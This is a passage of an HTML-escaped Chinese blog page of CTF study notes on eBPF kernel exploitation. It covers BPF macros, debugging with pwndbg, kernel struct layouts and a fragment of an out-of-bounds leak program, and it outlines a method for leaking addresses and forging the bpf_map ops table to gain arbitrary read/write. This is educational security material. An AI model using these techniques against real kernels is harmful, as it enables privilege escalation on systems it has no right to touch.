0, 0, 0x12)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_STX_XADD(SZ, DST, SRC, OFF)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;atomic_add&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;原子加法&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_STX_XADD(BPF_DW, BPF_REG_1, BPF_REG_0, 0)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;proc接口&#34;&gt;&lt;span&gt;proc接口&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proc%e6%8e%a5%e5%8f%a3&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;/proc/sys/net/core/bpf_jit_enable&lt;/code&gt; 可以检查 bpf 能不能被 JIT&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Values:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;0 - disable the JIT (default value)&lt;/li&gt;&#xA;&lt;li&gt;1 - enable the JIT&lt;/li&gt;&#xA;&lt;li&gt;2 - enable the JIT and ask the compiler to emit traces on kernel log.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;/proc/sys/kernel/unprivileged_bpf_disabled&lt;/code&gt; 可以检查是否能执行&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Values:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;0 - Unprivileged calls to &lt;code&gt;bpf()&lt;/code&gt; are enabled&lt;/li&gt;&#xA;&lt;li&gt;1 - Unprivileged calls to &lt;code&gt;bpf()&lt;/code&gt; are disabled without recovery&lt;/li&gt;&#xA;&lt;li&gt;2 - Unprivileged calls to &lt;code&gt;bpf()&lt;/code&gt; are disabled&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;查结构体&#34;&gt;&lt;span&gt;查结构体&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%9f%a5%e7%bb%93%e6%9e%84%e4%bd%93&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;在分配一个&lt;code&gt;array&lt;/code&gt;类型的&lt;code&gt;map&lt;/code&gt;的时候（&lt;code&gt;ebpf pwn&lt;/code&gt;中我们通常都使用&lt;code&gt;type&lt;/code&gt;为&lt;code&gt;array&lt;/code&gt;的&lt;code&gt;map&lt;/code&gt;），会调用函数&lt;code&gt;array_map_alloc&lt;/code&gt;（路径：&lt;code&gt;/kernel/bpf/arraymap.c&lt;/code&gt;）分配&lt;code&gt;struct bpf_array&lt;/code&gt;这个函数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;调用函数&lt;code&gt; bpf_map_area_alloc&lt;/code&gt;，分配&lt;code&gt;struct bpf_array&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;返回&lt;code&gt;&amp;amp;array-&amp;gt;map&lt;/code&gt;，也就是返回&lt;code&gt;bpf_array&lt;/code&gt;的&lt;code&gt;struct bpf_map&lt;/code&gt;，&lt;code&gt;array&lt;/code&gt;的首地址&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;   0xffffffff9b5d4d37 &amp;lt;array_map_alloc&amp;#43;151&amp;gt;:    mov    BYTE PTR [rbp-0x2d],r8b&#xD;&#xA;   0xffffffff9b5d4d3b &amp;lt;array_map_alloc&amp;#43;155&amp;gt;:    call   0xffffffff9b595030 &amp;lt;bpf_map_area_alloc&amp;gt;&#xD;&#xA;   0xffffffff9b5d4d40 &amp;lt;array_map_alloc&amp;#43;160&amp;gt;:    movzx  r8d,BYTE PTR [rbp-0x2d]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;fin&lt;/code&gt;这个函数后还没有分配&lt;code&gt;struct bpf_map&lt;/code&gt;中的&lt;code&gt;ops&lt;/code&gt;，会在这个函数的上层函数&lt;code&gt;__do_sys_bpf&lt;/code&gt;中设置&lt;code&gt;ops&lt;/code&gt;字段&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;ops只有一个，不同的bpf_map都指向同一个ops&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;调试命令：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;b array_map_alloc&#xD;&#xA;c&#xD;&#xA;fin&#xD;&#xA;set $array1 = $rax&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;实际执行bpf程序&#34;&gt;&lt;span&gt;实际执行bpf程序&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%9e%e9%99%85%e6%89%a7%e8%a1%8cbpf%e7%a8%8b%e5%ba%8f&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;这里的内核版本是6.12.47&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;断在&lt;code&gt;sk_filter_trim_cap&lt;/code&gt;中，&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;   0xffffffffb3da8d37 &amp;lt;sk_filter_trim_cap&amp;#43;151&amp;gt;: mov    rdi,rbx&#xD;&#xA;   0xffffffffb3da8d3a &amp;lt;sk_filter_trim_cap&amp;#43;154&amp;gt;: call   0xffffffffb3f6a940 &amp;lt;__x86_indirect_thunk_rax&amp;gt;&#xD;&#xA;   0xffffffffb3da8d3f &amp;lt;sk_filter_trim_cap&amp;#43;159&amp;gt;: mov    r15d,eax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当程序停在 &lt;code&gt;0xffffffffb3da8d3a&lt;/code&gt; 时，这个指令就是&lt;code&gt;call rax&lt;/code&gt;。此时 &lt;code&gt;RAX&lt;/code&gt; 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; p/x $rip&#xD;&#xA;$8 = 0xffffffffb3da8d3a&#xD;&#xA;pwndbg&amp;gt; i r rax&#xD;&#xA;rax            0xffffffffc022566c  -1071491476&#xD;&#xA;pwndbg&amp;gt; vmmap 0xffffffffc022566c&#xD;&#xA;LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA&#xD;&#xA;               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)&#xD;&#xA;  0xffffffffb49a3000 0xffffffffb4e00000 rw-p   45d000  462000 kernel [.bss]&#xD;&#xA;► 0xffffffffc0225000 0xffffffffc0425000 r-xp   200000       0 kernel [.driver .bpf] &amp;#43;0x66c&#xD;&#xA;pwndbg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;按&lt;code&gt;s&lt;/code&gt;步入之后，就是在执行&lt;code&gt;bpf&lt;/code&gt;程序了&lt;/p&gt;&#xA;&lt;p&gt;我这里的程序能对应上：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; p/x $rip&#xD;&#xA;$9 = 0xffffffffc022566c&#xD;&#xA;pwndbg&amp;gt; x/30i 0xffffffffc022566c&#xD;&#xA;=&amp;gt; 0xffffffffc022566c:  endbr64&#xD;&#xA;   0xffffffffc0225670:  nop    DWORD PTR [rax&amp;#43;rax*1&amp;#43;0x0]&#xD;&#xA;   0xffffffffc0225675:  nop    DWORD PTR [rax]&#xD;&#xA;   0xffffffffc0225678:  push   rbp&#xD;&#xA;   0xffffffffc0225679:  mov    rbp,rsp&#xD;&#xA;   0xffffffffc022567c:  endbr64&#xD;&#xA;   0xffffffffc0225680:  sub    rsp,0x8&#xD;&#xA;   0xffffffffc0225687:  push   rbx&#xD;&#xA;   0xffffffffc0225688:  push   r13&#xD;&#xA;   0xffffffffc022568a:  push   r14&#xD;&#xA;   0xffffffffc022568c:  push   r15&#xD;&#xA;   0xffffffffc022568e:  xor    eax,eax&#x9;&#x9;#BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;   0xffffffffc0225690:  mov    edi,0x63626160 &#x9;#BPF_MOV64_IMM(BPF_REG_1, test),&#xD;&#xA;   0xffffffffc0225695:  mov    DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),&#xD;&#xA;   0xffffffffc0225698:  lfence&#xD;&#xA;   0xffffffffc022569b:  mov    rbx,rdi&#x9;&#x9;#BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;   0xffffffffc022569e:  movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map),&#xD;&#xA;   0xffffffffc02256a8:  mov    rsi,rbp&#x9;&#x9;#BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;   0xffffffffc02256ab:  add    rsi,0xfffffffffffffffc  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;   0xffffffffc02256af:  add    rdi,0xf8&#xD;&#xA;   0xffffffffc02256b6:  mov    eax,DWORD PTR [rsi&amp;#43;0x0]&#xD;&#xA;   0xffffffffc02256b9:  cmp    rax,0x1&#xD;&#xA;   0xffffffffc02256bd:  jae    0xffffffffc02256ce&#xD;&#xA;   0xffffffffc02256bf:  and    eax,0x0&#xD;&#xA;   0xffffffffc02256c2:  imul   rax,rax,0x150&#xD;&#xA;   0xffffffffc02256c9:  add    rax,rdi&#xD;&#xA;   0xffffffffc02256cc:  jmp    0xffffffffc02256d0&#xD;&#xA;   0xffffffffc02256ce:  xor    eax,eax&#xD;&#xA;   0xffffffffc02256d0:  test   rax,rax&#xD;&#xA;   0xffffffffc02256d3:  jne    0xffffffffc02256de&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;    size_t test = 0;&#xD;&#xA;    memcpy(&amp;amp;test, &amp;#34;\x60\x61\x62\x63\x64\x65\x66\x67&amp;#34;, 8);&#xD;&#xA;&#xD;&#xA;    struct bpf_insn kleak_prog[] = {&#xD;&#xA;        // load map_ptr_or_null in BPF_REG_0&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_1, test),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, oob_map),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr &amp;#43; 0x110 (offset of .values in array_map)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;pwndbg&#34;&gt;&lt;span&gt;pwndbg&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#pwndbg&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;code&gt;pwndbg&lt;/code&gt;有一个命令&lt;code&gt;kbpf&lt;/code&gt;，但是题目编译的内核一般用不了这个命令，少了点东西。。。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;pwn思路&#34;&gt;&lt;span&gt;pwn思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#pwn%e6%80%9d%e8%b7%af&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;当我们用&lt;code&gt;bpf&lt;/code&gt;系统调用创建了一个类型为&lt;code&gt;BPF_MAP_TYPE_ARRAY&lt;/code&gt;的&lt;code&gt;map&lt;/code&gt;的时候，会创建一个结构体：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct bpf_array {&#xD;&#xA;        struct bpf_map             map;                  /*     0   240 */&#xD;&#xA;        /* --- cacheline 3 boundary (192 bytes) was 48 bytes ago --- */&#xD;&#xA;        u32                        elem_size;            /*   240     4 */&#xD;&#xA;        u32                        index_mask;           /*   244     4 */&#xD;&#xA;        struct bpf_array_aux *     aux;                  /*   248     8 */&#xD;&#xA;        /* --- cacheline 4 boundary (256 bytes) --- */&#xD;&#xA;        union {&#xD;&#xA;                struct {&#xD;&#xA;                        struct {&#xD;&#xA;                        } __empty_value;                 /*   256     0 */&#xD;&#xA;                        char       value[0];             /*   256     0 */&#xD;&#xA;                };                                       /*   256     0 */&#xD;&#xA;                struct {&#xD;&#xA;                        struct {&#xD;&#xA;                        } __empty_ptrs;                  /*   256     0 */&#xD;&#xA;                        void *     ptrs[0];              /*   256     0 */&#xD;&#xA;                };                                       /*   256     0 */&#xD;&#xA;                struct {&#xD;&#xA;                        struct {&#xD;&#xA;                        } __empty_pptrs;                 /*   256     0 */&#xD;&#xA;                        void *     pptrs[0];             /*   256     0 */&#xD;&#xA;                };                                       /*   256     0 */&#xD;&#xA;        };                                               /*   256     0 */&#xD;&#xA;&#xD;&#xA;        /* size: 256, cachelines: 4, members: 5 */&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中最重要的就是第一个成员：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct bpf_map {&#xD;&#xA;        const struct bpf_map_ops  * ops;                 /*     0     8 */&#xD;&#xA;        struct bpf_map *           inner_map_meta;       /*     8     8 */&#xD;&#xA;        void *                     security;             /*    16     8 */&#xD;&#xA;        enum bpf_map_type          map_type;             /*    24     4 */&#xD;&#xA;        u32                        key_size;             /*    28     4 */&#xD;&#xA;        u32                        value_size;           /*    32     4 */&#xD;&#xA;        u32                        max_entries;          /*    36     4 */&#xD;&#xA;        u64                        map_extra;            /*    40     8 */&#xD;&#xA;        u32                        map_flags;            /*    48     4 */&#xD;&#xA;        u32                        id;                   /*    52     4 */&#xD;&#xA;        struct btf_record *        record;               /*    56     8 */&#xD;&#xA;        /* --- cacheline 1 boundary (64 bytes) --- */&#xD;&#xA;        int                        numa_node;            /*    64     4 */&#xD;&#xA;        u32                        btf_key_type_id;      /*    68     4 */&#xD;&#xA;        u32                        btf_value_type_id;    /*    72     4 */&#xD;&#xA;        u32                        btf_vmlinux_value_type_id; /*    76     4 */&#xD;&#xA;        struct btf *               btf;                  /*    80     8 */&#xD;&#xA;        char                       name[16];             /*    88    16 */&#xD;&#xA;        struct mutex               freeze_mutex;         /*   104    32 */&#xD;&#xA;        /* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */&#xD;&#xA;        atomic64_t                 refcnt;               /*   136     8 */&#xD;&#xA;        atomic64_t                 usercnt;              /*   144     8 */&#xD;&#xA;        union {&#xD;&#xA;                struct work_struct work;                 /*   152    32 */&#xD;&#xA;                struct callback_head rcu;                /*   152    16 */&#xD;&#xA;        };                                               /*   152    32 */&#xD;&#xA;        atomic64_t                 writecnt;             /*   184     8 */&#xD;&#xA;        /* --- cacheline 3 boundary (192 bytes) --- */&#xD;&#xA;        struct {&#xD;&#xA;                const struct btf_type  * attach_func_proto; /*   192     8 */&#xD;&#xA;                spinlock_t         lock;                 /*   200     4 */&#xD;&#xA;                enum bpf_prog_type type;                 /*   204     4 */&#xD;&#xA;                bool               jited;                /*   208     1 */&#xD;&#xA;                bool               xdp_has_frags;        /*   209     1 */&#xD;&#xA;        } owner;                                         /*   192    24 */&#xD;&#xA;&#xD;&#xA;        /* XXX last struct has 6 bytes of padding */&#xD;&#xA;&#xD;&#xA;        bool                       bypass_spec_v1;       /*   216     1 */&#xD;&#xA;        bool                       frozen;               /*   217     1 */&#xD;&#xA;        bool                       free_after_mult_rcu_gp; /*   218     1 */&#xD;&#xA;        bool                       free_after_rcu_gp;    /*   219     1 */&#xD;&#xA;&#xD;&#xA;        /* XXX 4 bytes hole, try to pack */&#xD;&#xA;&#xD;&#xA;        atomic64_t                 sleepable_refcnt;     /*   224     8 */&#xD;&#xA;        s64 *                      elem_count;           /*   232     8 */&#xD;&#xA;&#xD;&#xA;        /* size: 240, cachelines: 4, members: 29 */&#xD;&#xA;        /* sum members: 236, holes: 1, sum holes: 4 */&#xD;&#xA;        /* paddings: 1, sum paddings: 6 */&#xD;&#xA;        /* last cacheline: 48 bytes */&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;bpf_map_ops&lt;/code&gt;中存的是一系列虚表函数。通常，我们需要通过越界读写等手段，修改这个虚表&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// include/linux/bpf.h&#xD;&#xA;/* map is generic key/value storage optionally accessible by eBPF programs */&#xD;&#xA;struct bpf_map_ops {&#xD;&#xA;&#x9;// ...&#xD;&#xA;&#xD;&#xA;&#x9;/* funcs callable from userspace and from eBPF programs */&#xD;&#xA;&#x9;void *(*map_lookup_elem)(struct bpf_map *map, void *key);&#xD;&#xA;&#x9;long (*map_update_elem)(struct bpf_map *map, void *key, void *value, u64 flags);&#xD;&#xA;&#x9;long (*map_delete_elem)(struct bpf_map *map, void *key);&#xD;&#xA;&#x9;long (*map_push_elem)(struct bpf_map *map, void *value, u64 flags);&#xD;&#xA;&#x9;long (*map_pop_elem)(struct bpf_map *map, void *value);&#xD;&#xA;    &#xD;&#xA;&#x9;// ...&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;泄露地址：把&lt;code&gt;ops&lt;/code&gt;写回&lt;code&gt;bpf_array&lt;/code&gt;中的&lt;code&gt;values&lt;/code&gt;域中，读出来即可&lt;/li&gt;&#xA;&lt;li&gt;任意地址读写：在&lt;code&gt;values&lt;/code&gt;中伪造一个&lt;code&gt;ops&lt;/code&gt;，劫持&lt;code&gt;ops&lt;/code&gt;指针指向这个伪造的&lt;code&gt;ops&lt;/code&gt;，这样调用某个虚表函数其实是调用我们想要调用的函数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;helper function&lt;/code&gt;是内核定义的函数，能被&lt;code&gt;ebpf&lt;/code&gt;程序调用&lt;/p&gt;&#xA;&lt;p&gt;重要的函数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;bpf_map_lookup_elem&lt;/code&gt;：&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;模板&#34;&gt;&lt;span&gt;模板&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%a8%a1%e6%9d%bf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;例题&#34;&gt;&lt;span&gt;例题&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%be%8b%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;sec-con-ctf-2021-kone_gadget&#34;&gt;&lt;span&gt;SEC CON CTF 2021 kone_gadget&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#sec-con-ctf-2021-kone_gadget&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 